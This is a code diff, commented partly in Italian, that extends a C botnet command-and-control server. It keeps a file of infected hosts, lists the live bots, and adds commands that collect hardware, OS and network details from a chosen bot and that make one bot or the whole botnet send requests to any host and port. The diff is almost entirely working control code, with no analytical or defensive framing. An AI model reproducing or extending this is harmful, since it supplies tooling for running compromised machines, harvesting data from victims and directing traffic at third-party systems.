@@ -6,16 +6,9 @@
 #include "cJSON.h"
 #include <time.h>
 #include <pthread.h>
-#include <netdb.h> // Per usare getaddrinfo
-
-#define PORT 8081
+#include <curl/curl.h>
 #define MAX_REQUEST_SIZE 1024
-#define TIMEOUT_SECONDS 5
-
-struct Data {
-    char clientIP[20];
-    char ports[20][6];
-};
+#define MAX_RESPONSE_SIZE 8192
 
 void handle_get_request(int client_socket) {
     char response[] = "HTTP/1.1 200 OK\r\n"
@@ -36,7 +29,7 @@ void updateBotRecord(const char *clientIP, int port) {
         FILE *tempFile = fopen("bots_temp.txt", "w");
         if (tempFile == NULL) {
             fclose(file);
-            fprintf(stderr, "Errore nella creazione del file temporaneo 'bots_temp.txt'\n");
+            fprintf(stderr, "error creating 'bots_temp.txt'\n");
             return;
         }
 
@@ -78,20 +71,81 @@ void updateBotRecord(const char *clientIP, int port) {
 
         // Sostituisci il file originale con il file temporaneo
         if (remove("bots.txt") != 0) {
-            fprintf(stderr, "Errore nella rimozione del file 'bots.txt'\n");
+            fprintf(stderr, "file 'bots.txt' error\n");
         }
         if (rename("bots_temp.txt", "bots.txt") != 0) {
-            fprintf(stderr, "Errore nella sostituzione del file 'bots.txt'\n");
+            fprintf(stderr, "file 'bots.txt' error\n");
         }
     } else {
-        fprintf(stderr, "Errore nell'apertura o creazione del file 'bots.txt'\n");
+        fprintf(stderr, "file 'bots.txt' error\n");
     }
 }
 
+// Funzione per scrivere la risposta HTTP in una stringa
+static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
+    size_t realsize = size * nmemb;
+    char *response = (char *)userp;
+
+    if (realsize + 1 > MAX_RESPONSE_SIZE) {
+        fprintf(stderr, "Response Too Big!\n");
+        return 0;
+    }
+
+    memcpy(response, contents, realsize);
+    response[realsize] = '\0'; // Aggiungi il terminatore null
+
+    return realsize;
+}
+// Funzione per stampare le informazioni di sistema da un JSON
+void printSystemInfo(const char *jsonStr) {
+    // Analizza il JSON
+    cJSON *json = cJSON_Parse(jsonStr);
+    if (json == NULL) {
+        fprintf(stderr, "error parsing JSON\n");
+        return;
+    }
+
+    // Estrai e stampa le informazioni di sistema
+    cJSON *infoRAMItem = cJSON_GetObjectItem(json, "infoRAM");
+    cJSON *infoHDItem = cJSON_GetObjectItem(json, "infoHD");
+    cJSON *infoOSItem = cJSON_GetObjectItem(json, "infoOS");
+    cJSON *infoCPUItem = cJSON_GetObjectItem(json, "infoCPU");
+    cJSON *infoNetworkItem = cJSON_GetObjectItem(json, "infoNetwork");
+
+    if (infoRAMItem != NULL) {
+        printf("Memory information:\n%s\n", infoRAMItem->valuestring);
+    } else {
+        printf("Memory information not available.\n");
+    }
+
+    if (infoHDItem != NULL) {
+        printf("Hard drive information:\n%s\n", infoHDItem->valuestring);
+    } else {
+        printf("Hard drive information not available.\n");
+    }
+
+    if (infoOSItem != NULL) {
+        printf("Operating System information:\n%s\n", infoOSItem->valuestring);
+    } else {
+        printf("Operating System information not available.\n");
+    }
+
+    if (infoCPUItem != NULL) {
+        printf("CPU information:\n%s\n", infoCPUItem->valuestring);
+    } else {
+        printf("CPU information not available.\n");
+    }
+
+    if (infoNetworkItem != NULL) {
+        printf("Network information:\n%s\n", infoNetworkItem->valuestring);
+    } else {
+        printf("Network information not available.\n");
+    }
+
+    cJSON_Delete(json);
+}
 
 void handle_post_request(int client_socket, char *data) {
-//    printf("Received POST data: %s\n", data);
-
     cJSON *json = cJSON_Parse(data);
     if (json == NULL) {
         char response[] = "HTTP/1.1 400 Bad Request\r\n\r\n";
@@ -146,6 +200,96 @@ void handle_post_request(int client_socket, char *data) {
     free(clientIP);
 }
 
+// Funzione per inviare la richiesta a un bot specifico o a tutti i bot
+void sendRequestToBot(const char *target, const char *requestJsonStr) {
+    // Apri il file "bots.txt" in modalità di lettura
+    FILE *file = fopen("bots.txt", "r");
+    if (file == NULL) {
+        printf("No connected bots currently.\n");
+        return;
+    }
+
+    char line[1024];
+    int currentBot = 0;
+
+    // Cicla attraverso tutti i bot nel file bots.txt
+    while (fgets(line, sizeof(line), file) != NULL) {
+        currentBot++;
+        char *timestamp = strtok(line, "|");
+        char *ip = strtok(NULL, "|");
+        char *portStr = strtok(NULL, "|");
+
+        if (ip != NULL && portStr != NULL) {
+            int port = atoi(portStr);
+
+            // Controlla se il target è un numero o un asterisco "*"
+            if (strcmp(target, "*") == 0 || (atoi(target) == currentBot)) {
+                // Invia la richiesta HTTP POST al bot corrente
+                CURL *curl;
+                CURLcode res;
+
+                curl_global_init(CURL_GLOBAL_DEFAULT);
+
+                curl = curl_easy_init();
+                if (curl) {
+                    // Crea l'URL con l'indirizzo IP e la porta
+                    char url[100];
+                    snprintf(url, sizeof(url), "http://%s:%d", ip, port);
+
+                    // Imposta l'URL
+                    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+                    // Imposta i dati JSON da inviare
+                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, requestJsonStr);
+
+                    // Esegui la richiesta POST
+                    res = curl_easy_perform(curl);
+                    if (res != CURLE_OK) {
+                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+                    } else {
+                        // Stampa il messaggio di richiesta inviata
+                        printf("Richiesta inviata dal bot %d\n", currentBot);
+
+                        // Chiudi la sessione CURL
+                        curl_easy_cleanup(curl);
+                    }
+                }
+
+                curl_global_cleanup();
+            }
+        } else {
+            printf("Invalid format in bots.txt.\n");
+        }
+    }
+
+    fclose(file);
+}
+
+// Funzione per inviare una richiesta a un bot specifico
+void sendRequest(const char *command) {
+    char hostname[256];
+    char port[32];
+    char target[32];
+
+    if (sscanf(command + 8, "%255s %31s %31s", hostname, port, target) == 3) {
+        // Creare il JSON per la richiesta
+        cJSON *requestJson = cJSON_CreateObject();
+        cJSON_AddStringToObject(requestJson, "command", "request");
+        cJSON_AddStringToObject(requestJson, "hostname", hostname);
+        cJSON_AddStringToObject(requestJson, "port", port);
+        char *requestJsonStr = cJSON_Print(requestJson);
+        cJSON_Delete(requestJson);
+
+        // Invia la richiesta al bot corrispondente
+        sendRequestToBot(target, requestJsonStr);
+
+        // Libera la memoria allocata per requestJsonStr
+        free(requestJsonStr);
+    } else {
+        printf("Invalid request format. Use 'request {hostname} {port}  {target}'.\n");
+    }
+}
+
 int isBotListening(const char *address, int port) {
     struct sockaddr_in server_addr;
     int sockfd;
@@ -179,6 +323,88 @@ int isBotListening(const char *address, int port) {
         close(sockfd);
         return 0;  // Non in ascolto (errore nella connessione)
     }
+}
+
+void getInfo(int commandNumber) {
+    if (commandNumber <= 0) {
+        printf("Invalid command number.\n");
+        return;
+    }
+
+    // Apri il file "bots.txt" in modalità di lettura
+    FILE *file = fopen("bots.txt", "r");
+    if (file == NULL) {
+        printf("Error opening bots.txt for reading.\n");
+        return;
+    }
+
+    char line[1024];
+    int currentCommandNumber = 0;
+
+    // Cerca il comando corrispondente nel file bots.txt
+    while (fgets(line, sizeof(line), file) != NULL) {
+        currentCommandNumber++;
+        if (currentCommandNumber == commandNumber) {
+            char *timestamp = strtok(line, "|");
+            char *ip = strtok(NULL, "|");
+            char *portStr = strtok(NULL, "|");
+
+            if (ip != NULL && portStr != NULL) {
+                int port = atoi(portStr);
+
+                // Invia la richiesta HTTP POST
+                CURL *curl;
+                CURLcode res;
+
+                curl_global_init(CURL_GLOBAL_DEFAULT);
+
+                curl = curl_easy_init();
+                if (curl) {
+                    // Crea il JSON
+                    char json[100];
+                    snprintf(json, sizeof(json), "{\"command\":\"get info\"}");
+
+                    // Crea l'URL con l'indirizzo IP e la porta
+                    char url[100];
+                    snprintf(url, sizeof(url), "http://%s:%d", ip, port);
+
+                    // Imposta l'URL
+                    curl_easy_setopt(curl, CURLOPT_URL, url);
+
+                    // Imposta i dati JSON da inviare
+                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
+
+                    // Inizializza responseString per memorizzare la risposta
+                    char responseString[MAX_RESPONSE_SIZE]; // Assumi che MAX_RESPONSE_SIZE sia definito
+
+                    // Imposta la callback per scrivere la risposta nella responseString
+                    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
+                    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&responseString);
+
+                    // Esegui la richiesta POST
+                    res = curl_easy_perform(curl);
+                    if (res != CURLE_OK) {
+                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+                    } else {
+                        // Chiudi la sessione CURL
+                        curl_easy_cleanup(curl);
+
+                        // Chiamata per stampare le informazioni di sistema dalla risposta JSON
+                        printSystemInfo(responseString);
+                    }
+                }
+
+                curl_global_cleanup();
+
+//                printf("Sent POST request to %s:%d\n", ip, port);
+            } else {
+                printf("Invalid format in bots.txt.\n");
+            }
+            break;
+        }
+    }
+
+    fclose(file);
 }
 
 void printBotList() {
@@ -222,22 +448,35 @@ void printBotList() {
         }
     }
 
-    // Chiudi il file
+    // Chiudi il file "bots.txt"
     fclose(file);
 
-    // Stampare la lista di indirizzi IP e porte più aggiornata
+    if (numBots == 0) {
+        printf("No connected bots currently.\n");
+        return;
+    }
+
+    // Apri il file "list.txt" in modalità scrittura (sovrascrittura)
+    FILE *listFile = fopen("list.txt", "w");
+    if (listFile == NULL) {
+        printf("Error opening list.txt for writing.\n");
+        return;
+    }
+
+    // Stampa e scrivi la lista di indirizzi IP e porte più aggiornata
     int activeBotCount = 0;
+    fprintf(listFile, "List of active bots with the most updated port numbers:\n");
     printf("List of active bots with the most updated port numbers:\n");
     for (int i = 0; i < numBots; i++) {
         if (isBotListening(botAddresses[i], botPorts[i])) {
+            fprintf(listFile, "%d) %s %d\n", activeBotCount + 1, botAddresses[i], botPorts[i]);
             printf("%d) %s %d\n", activeBotCount + 1, botAddresses[i], botPorts[i]);
             activeBotCount++;
         }
     }
 
-    if (activeBotCount == 0) {
-        printf("No connected bots currently.\n");
-    }
+    // Chiudi il file "list.txt"
+    fclose(listFile);
 }
 
 // Funzione del thread per la gestione dell'input dell'utente
@@ -255,11 +494,22 @@ void *user_input_thread(void *arg) {
         // list command
         if (strcmp(command, "list\n") == 0) {
             // Eseguire un'azione di uscita o terminare il server
-            printf("1) botnet\n get the list of ip and ports of active bots with specific target id.\n\n2) request {hostname:port} {target}\n Send a request to a specified hostname and port via bot.\n\n3) get info {target}\n Receive hardware and software information about hosts connected to this botnet.\n\n");
+            printf("1) botnet\n get the list of ip and ports of active bots with specific target id.\n\n2) request {hostname} {port} {target}\n Send a request to a specified hostname and port via bot.\n Use wildcard * to send request from all botnet.\n Examples:\n  $ request localhost 5000 *\n  $ request localhost 5000 1\n\n3) get info {target}\n Receive hardware and software information about hosts connected to this botnet.\n\n");
         }
             // botnet command
         else if (strcmp(command, "botnet\n") == 0) {
             printBotList();
+        }
+            // get info command
+        else if (strncmp(command, "get info ", 9) == 0) {
+            int target = atoi(command + 9); // Estrai l'argomento numerico dopo "get info "
+
+            // Esegui la funzione getInfo con l'ID del target
+            getInfo(target);
+        }
+            // request command
+        else if (strncmp(command, "request ", 8) == 0) {
+            sendRequest(command);
         }
             // exit command
         else if (strcmp(command, "exit\n") == 0) {
@@ -271,7 +521,12 @@ void *user_input_thread(void *arg) {
     return NULL;
 }
 
-int main() {
+int main(int argc, char *argv[]) {
+    int PORT = 8081;
+    // Verifica se è stato passato un argomento per la porta
+    if (argc == 2) {
+        PORT = atoi(argv[1]); // Converti l'argomento in un numero intero
+    }
     int server_socket, client_socket;
     struct sockaddr_in server_addr, client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
